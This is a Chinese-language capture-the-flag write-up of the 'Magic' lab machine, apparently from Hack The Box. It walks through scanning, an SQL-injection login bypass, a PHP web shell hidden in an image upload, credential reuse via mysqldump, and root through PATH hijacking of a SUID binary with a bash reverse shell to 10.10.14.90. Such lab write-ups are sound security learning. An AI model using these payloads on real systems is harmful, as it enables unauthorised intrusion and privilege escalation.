## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:Magic
2. 難度:Medium
3. IP:10.129.2.199

### 主要發現：
1. 漏洞 ：（風險等級：）
2. 漏洞 ：（風險等級：）

### 攻擊鏈摘要：

### 潛在影響：

### 修復建議：

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放埠
```bash
sudo nmap -sT -Pn --min-rate 5000 -p- 10.129.2.199 -oA portscan/ports
sudo nmap -sT -Pn -sV -sC -O -p99,22,80 10.129.2.199 -oA portscan/detail
sudo nmap -sT -Pn -sV -sC -O -p22,80 10.129.2.199 -oA portscan/vuln
```
<img width="843" height="276" alt="螢幕擷取畫面 2026-03-08 210952" src="https://github.com/user-attachments/assets/c8d74a57-7dcf-4f30-9051-2e9d150c9ebc" />
<img width="1113" height="491" alt="螢幕擷取畫面 2026-03-08 211134" src="https://github.com/user-attachments/assets/38744435-3bc1-462c-8411-d3bfdceed9dd" />
<img width="712" height="673" alt="螢幕擷取畫面 2026-03-08 211231" src="https://github.com/user-attachments/assets/b9f66ae9-aa11-45ad-9d2e-18d2a7893399" />

使用whtaweb確認網站消息
```bash
whatweb http://10.129.2.199
```
<img width="1660" height="85" alt="螢幕擷取畫面 2026-03-08 211441" src="https://github.com/user-attachments/assets/0798ccfa-0d4b-4a62-a1ab-a20797755ae2" />

檢查80主頁和/login.php

<img width="1894" height="892" alt="螢幕擷取畫面 2026-03-08 211456" src="https://github.com/user-attachments/assets/031fbf72-cdf9-4177-a318-97a4e1979275" />
<img width="1889" height="888" alt="螢幕擷取畫面 2026-03-08 211546" src="https://github.com/user-attachments/assets/d8ce2187-393e-4e90-becd-0286ace50bcd" />

我還有檢查JS跟圖片內容，無果

### 2.2 枚舉(Enumeration)

使用gobuster爆破目錄
```bash
sudo gobuster dir -u http://10.129.2.199 -w /usr/share/wordlists/dirb/common.txt
sudo gobuster dir -u http://10.129.2.199 -w /usr/share/wordlists/dirb/common.txt -x php,txt
```
<img width="769" height="551" alt="螢幕擷取畫面 2026-03-08 212000" src="https://github.com/user-attachments/assets/d0610aa5-e08a-4dd1-82d0-728a001c1481" />
<img width="868" height="784" alt="螢幕擷取畫面 2026-03-08 212812" src="https://github.com/user-attachments/assets/8486437b-c909-41cb-854a-878c74a5f9ce" />

對/login.php簡單枚舉，先用幾組常見弱密碼後嘗試簡單SQLi，沒想到直接進去了
```mysql
' or 1=1 -- -
```
<img width="1440" height="845" alt="螢幕擷取畫面 2026-03-08 212354" src="https://github.com/user-attachments/assets/8f6b26b6-d85c-4dd5-a291-615fe7239342" />


### 2.3 初始存取(Initial Access)

嘗試直接上傳php檔

<img width="769" height="628" alt="螢幕擷取畫面 2026-03-08 212839" src="https://github.com/user-attachments/assets/604b99a5-417a-4411-b001-878b149f7ea8" />


在錯誤訊息中了解到白名單

<img width="675" height="424" alt="螢幕擷取畫面 2026-03-08 212853" src="https://github.com/user-attachments/assets/ff63f55e-d7a9-4b7c-b4b2-51392649536d" />

隨意上傳一張圖片，成功

<img width="507" height="77" alt="螢幕擷取畫面 2026-03-08 213402" src="https://github.com/user-attachments/assets/bfff7ee8-b939-4838-8095-8ce62250f32e" />
<img width="719" height="164" alt="螢幕擷取畫面 2026-03-08 213425" src="https://github.com/user-attachments/assets/0fd86a9b-7dde-4495-8a05-b4fb5e1b5539" />

圖片出現在主頁

<img width="745" height="655" alt="螢幕擷取畫面 2026-03-08 214152" src="https://github.com/user-attachments/assets/3a3de15d-5d8b-4aa9-a3c5-d3a197f36f16" />

可右鍵打開新頁面

<img width="1272" height="759" alt="螢幕擷取畫面 2026-03-08 214153" src="https://github.com/user-attachments/assets/22daa1a2-6ced-4841-88a1-7efce748a630" />

將shell.php塞到.jpeg檔中，以shell.jpeg為Payload嘗試各種繞過

只要符合白名單即可上傳，但不一定會被解析

```bash
cat images.jpeg shell.php > shell.jpeg
```

<img width="507" height="210" alt="螢幕擷取畫面 2026-03-08 215104" src="https://github.com/user-attachments/assets/80ffaaf2-35a8-436a-847e-e19423c01d99" />

開啟nc監聽等待連接
```bash
nc -lvnp 1234
```
<img width="301" height="93" alt="螢幕擷取畫面 2026-03-08 215146" src="https://github.com/user-attachments/assets/84bc675b-b851-48b6-bad2-1c51c9d84d23" />

手動嘗試數次後，發現.php.png可以被上傳並解析

<img width="366" height="57" alt="螢幕擷取畫面 2026-03-08 215834" src="https://github.com/user-attachments/assets/b9dca3ec-1950-4d90-844b-1e790886e44f" />
<img width="1234" height="666" alt="螢幕擷取畫面 2026-03-08 215850" src="https://github.com/user-attachments/assets/a0fd14db-446b-4971-84db-48fdbf87261c" />
<img width="1388" height="712" alt="螢幕擷取畫面 2026-03-08 215946" src="https://github.com/user-attachments/assets/30d4721e-44f8-486b-9aa3-9db8cdc7e488" />

獲得反向Shell

<img width="965" height="335" alt="螢幕擷取畫面 2026-03-08 215957" src="https://github.com/user-attachments/assets/148b39a7-a7e2-4aef-b77c-7b5a08d9e0d9" />


### 2.4 橫向移動(Lateral Movement)

初始權限不被允許讀取user.txt，並且得知家目錄是有桌面的(結果來說並未用上，但可能用上，所以得意識到)

<img width="688" height="746" alt="螢幕擷取畫面 2026-03-08 220409" src="https://github.com/user-attachments/assets/00a97d49-08df-48fe-9754-9f0bfeb57535" />

回到/var/www探索後，找到資料庫檔案

<img width="545" height="384" alt="螢幕擷取畫面 2026-03-08 220602" src="https://github.com/user-attachments/assets/59e982f4-d6fa-4945-9c63-d5ba911ec47d" />

打開以後獲得資料庫憑證和類型

<img width="571" height="298" alt="螢幕擷取畫面 2026-03-08 220623" src="https://github.com/user-attachments/assets/0f731832-7ef6-44b6-ba28-808cac6af2ab" />
<img width="1198" height="85" alt="螢幕擷取畫面 2026-03-08 220745" src="https://github.com/user-attachments/assets/506eb439-90eb-4722-b362-1cbed43a285f" />

當前系統下並沒有安裝mysql，但有mysqldump，它是個備份工具，在連線下載或傳輸公用之前嘗試使用，看是否吐什麼情報出來，「Live off the land」
```bash
which mysql
which mysqldump
mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
```
<img width="469" height="115" alt="螢幕擷取畫面 2026-03-08 221056" src="https://github.com/user-attachments/assets/3bdf3fa8-12c4-4ad4-9f68-fbabd4248bd4" />

<img width="977" height="378" alt="螢幕擷取畫面 2026-03-08 221638" src="https://github.com/user-attachments/assets/bdb524f5-b624-43e6-bd27-b6792cd9c2e9" />

獲得了一組憑證

<img width="624" height="313" alt="螢幕擷取畫面 2026-03-08 221655" src="https://github.com/user-attachments/assets/a0c36e69-b404-4142-91b9-f371d85df065" />

SSH服務不允許連接，是公鑰問題

<img width="745" height="229" alt="螢幕擷取畫面 2026-03-08 221819" src="https://github.com/user-attachments/assets/5e7f9d1e-9bda-414e-a1b1-a90d56a376be" />

使用su命令連接成功
```bash
su theseus
```
<img width="424" height="103" alt="螢幕擷取畫面 2026-03-08 222024" src="https://github.com/user-attachments/assets/17419547-ef9d-4d0c-8c9e-80047ece445d" />

獲得user.txt

<img width="481" height="205" alt="螢幕擷取畫面 2026-03-08 222110" src="https://github.com/user-attachments/assets/5ef3b212-e922-48c5-94f1-1256ba8451b0" />


### 2.5 權限提升(Privilege Escalation)

探索SUID權限，可以將/snap過濾掉
```bash
find / -perm -u=s -type f 2>/dev/null
find / -path "/snap" -prune -o -perm -u=s -type f -print 2>/dev/null
```

<img width="590" height="685" alt="螢幕擷取畫面 2026-03-08 222440" src="https://github.com/user-attachments/assets/f3d97eda-fac5-485c-97a1-836d74386d5c" />

<img width="786" height="492" alt="螢幕擷取畫面 2026-03-08 222856" src="https://github.com/user-attachments/assets/220b0aca-fe35-4941-ac62-8264983cc67e" />

檢查/bin/sysinfo，執行後會噴非常多東西出來

<img width="686" height="670" alt="螢幕擷取畫面 2026-03-08 223014" src="https://github.com/user-attachments/assets/667c0e83-c8c6-4f36-82c2-da3a88a1b51c" />

先用strings檢查，此工具會印出可讀字串
```bash
strings /bin/sysinfo
```

<img width="905" height="347" alt="螢幕擷取畫面 2026-03-08 224855" src="https://github.com/user-attachments/assets/5f148ef6-6335-4506-923b-51bdd27b4ece" />

其中有些感興趣的內容，popen()可以執行系統命令，且cat命令並未使用絕對路徑

<img width="488" height="154" alt="螢幕擷取畫面 2026-03-08 225041" src="https://github.com/user-attachments/assets/cc37ed75-8076-40d1-b0cc-0f5be0b8b53c" />

先印出相關的語句，ltrace命令會追蹤進程的動態庫函數，也可使用strace命令，它追蹤追蹤系統呼叫

我先使用ltrace命令，因為我要用grep篩選，而ltrace命令預設將追蹤結果輸出到stderr，所以需要重定向
```bash
ltrace sysinfo 2>&1 | grep "popen"
```

<img width="621" height="162" alt="螢幕擷取畫面 2026-03-08 225955" src="https://github.com/user-attachments/assets/1e32bc24-0ae7-4300-9878-f540100b7f20" />

popen調用的工具均沒有使用絕對路徑，用哪一個劫持路徑都可以，這裡我選擇fdisk，選其他的也會成功，但cat命令對我來說優先度最低，因為cat是常用命令，我不希望破壞掉常用命令，導致被其他使用者發現的風險增加

提權邏輯:先移動到/dev/shm目錄(或/tmp)，在此目錄下建立名為fdisk的腳本，其中有反彈Shell的系統命令，並且賦予其使用權限，再利用路徑劫持替代掉sysinfo的呼叫目標，執行後即可提權。

建立fdisk腳本
```bash
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.90/4444 0>&1' > fdisk
chmod +x fdisk
```

腳本內容為
```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.90/4444 0>&1
```

<img width="927" height="292" alt="螢幕擷取畫面 2026-03-08 230508" src="https://github.com/user-attachments/assets/99f11201-2408-4396-a140-e6803f4b0660" />

建立nc監聽
```bash
nc -lvnp 4444
```

<img width="276" height="97" alt="螢幕擷取畫面 2026-03-08 230616" src="https://github.com/user-attachments/assets/f9b52cb4-85f3-4205-8277-ada88eeee2e0" />

先嘗試單獨執行
```bash
./fdisk
```

<img width="361" height="60" alt="螢幕擷取畫面 2026-03-08 230631" src="https://github.com/user-attachments/assets/9a91189f-636d-45ab-989f-302e2625ff1f" />

獲得使用者權限的反彈Shell

<img width="557" height="146" alt="螢幕擷取畫面 2026-03-08 230639" src="https://github.com/user-attachments/assets/39550e5d-1e5d-4c35-b2eb-20325a7500d6" />

劫持路徑
```bash
echo $PATH
export PATH="/dev/shm:$PATH"
echo $PATH
```
<img width="904" height="179" alt="螢幕擷取畫面 2026-03-08 230808" src="https://github.com/user-attachments/assets/c5e11057-114d-4cef-a017-3fa83cc02f12" />

執行sysinfo
```bash
sysinfo
```

<img width="691" height="278" alt="螢幕擷取畫面 2026-03-08 230903" src="https://github.com/user-attachments/assets/6c6ff12e-29ed-4a38-8af4-0cf4634567f4" />

獲得反彈Shell

<img width="587" height="205" alt="螢幕擷取畫面 2026-03-08 230919" src="https://github.com/user-attachments/assets/3159239f-1699-43b6-8874-5a64080e5cec" />


### 2.6 最終成果(Impact)

獲得root.txt


<img width="1054" height="269" alt="螢幕擷取畫面 2026-03-08 231038" src="https://github.com/user-attachments/assets/f878684b-6534-4931-991d-fd4232bc5481" />


---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：
### 浪費時間的部分：
### 新知識點：
### 與實戰對應：
